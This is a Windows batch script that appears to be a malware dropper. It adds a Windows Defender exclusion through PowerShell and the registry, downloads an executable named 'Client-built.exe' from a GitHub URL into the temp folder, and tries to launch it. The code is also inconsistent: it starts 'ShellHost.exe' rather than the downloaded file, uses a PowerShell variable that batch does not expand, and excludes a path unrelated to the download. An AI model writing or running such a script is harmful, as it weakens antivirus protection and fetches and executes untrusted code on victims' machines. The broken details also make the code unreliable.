@echo off
REM Run PowerShell to add exclusion path to Windows Defender
PowerShell.exe -Command "Add-MpPreference -ExclusionPath 'C:\Invoke-WebRequest'"

REM Add registry key to disable Windows Defender (optional)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v "C:\Invoke-WebRequest" /f

REM Download the file from GitHub
PowerShell.exe -Command "Invoke-WebRequest -Uri 'https://github.com/vivaanv987-cloud/test/raw/refs/heads/main/Client-built.exe' -OutFile '$env:TEMP\Client-built.exe'"

REM Start the downloaded file (ShellHost.exe)
start $env:TEMP\ShellHost.exe

exit
